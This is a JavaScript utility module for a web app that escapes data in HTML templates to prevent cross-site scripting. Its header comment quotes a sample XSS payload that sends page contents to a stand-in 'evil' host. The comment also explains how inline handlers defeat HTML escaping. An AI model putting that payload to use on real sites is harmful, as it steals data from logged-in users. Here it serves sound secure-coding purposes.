// ── safe-html.js ──────────────────────────────────────────────────────────
// The single, shared way this app turns data into markup.
//
// WHY THIS EXISTS
// ---------------
// Building HTML with plain template literals is unsafe by default: any
// `${value}` holding attacker-controlled text (an employee name, a Google
// calendar title, a center name) is parsed as MARKUP, not text. A name like
//   <img src=x onerror="fetch('//evil/?d='+document.body.innerHTML)">
// stops being a name and becomes an element that runs script inside the
// manager's logged-in session.
//
// The old fix was to remember to call esc() on every interpolation. That
// fails for two reasons: you eventually forget on a new line, and — more
// importantly — HTML-escaping CANNOT secure a JavaScript context. Given
//   onclick="doThing('${esc(name)}')"
// the HTML parser decodes entities BEFORE the JS engine parses the attribute,
// so an escaped quote turns back into a real quote and breaks out anyway.
//
// So this module does two things:
//   1. `html` — a tagged template that escapes every interpolation by default.
//      Safety is the default; unsafety must be spelled out via trusted().
//   2. It deliberately does NOT try to make inline handlers safe. Anywhere a
//      handler needs data, use a data-* attribute + addEventListener instead
//      (see the delegation blocks in dashboard/scheduler/availability/admin).
//
// USAGE
//   setHTML(el, html`<span class="name">${user.name}</span>`);
//
//   Nesting works — html`` returns a TrustedHTML, which is re-emitted as-is:
//     const rows = items.map((i) => html`<li>${i.name}</li>`);
//     setHTML(list, html`<ul>${rows}</ul>`);   // arrays join automatically
//
//   Escaping applies to attribute values too, so long as they are QUOTED:
//     html`<div style="background:${color}">`   // fine
//     html`<div style=background:${color}>`     // NOT fine — always quote
// ──────────────────────────────────────────────────────────────────────────

(function (global) {
  "use strict";

  // Escapes the five characters that carry structural meaning in HTML text
  // and quoted-attribute contexts. `'` is included because single-quoted
  // attributes are common in this codebase.
  function escapeHtml(value) {
    if (value === null || value === undefined) return "";
    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  // A marker class meaning "this string is already markup — emit it verbatim".
  // Only html`` and trusted() ever produce one, so the only way to get raw
  // output is to have gone through one of those two on purpose.
  function TrustedHTML(value) {
    this.value = String(value);
  }
  TrustedHTML.prototype.toString = function () {
    return this.value;
  };

  // Escape hatch for markup you built yourself and know is safe (static
  // strings, or output from another html`` call). NEVER pass user data here.
  function trusted(value) {
    return new TrustedHTML(value);
  }

  function render(value) {
    if (value instanceof TrustedHTML) return value.value;
    if (Array.isArray(value)) return value.map(render).join("");
    return escapeHtml(value);
  }

  // The tagged template. Every ${...} is escaped unless it is a TrustedHTML
  // (or an array of them), which lets builders compose without double-escaping.
  function html(strings, ...values) {
    let out = strings[0];
    for (let i = 0; i < values.length; i++) {
      out += render(values[i]) + strings[i + 1];
    }
    return new TrustedHTML(out);
  }

  // Assigns markup to an element. Accepts a TrustedHTML (normal case) or a
  // plain string (for the static, interpolation-free literals already in the
  // codebase). Passing a plain string is allowed but should never carry data.
  function setHTML(el, value) {
    if (!el) return el;
    el.innerHTML = value instanceof TrustedHTML ? value.value : String(value);
    return el;
  }

  // Builds a detached element with markup inside it — the common
  // "createElement + innerHTML" pair, in one call.
  function elem(tag, className, value) {
    const el = document.createElement(tag);
    if (className) el.className = className;
    if (value !== undefined) setHTML(el, value);
    return el;
  }

  global.escapeHtml = escapeHtml;
  global.TrustedHTML = TrustedHTML;
  global.trusted = trusted;
  global.html = html;
  global.setHTML = setHTML;
  global.elem = elem;

  if (typeof module !== "undefined" && module.exports) {
    module.exports = { escapeHtml, TrustedHTML, trusted, html, setHTML, elem };
  }
})(typeof window !== "undefined" ? window : globalThis);
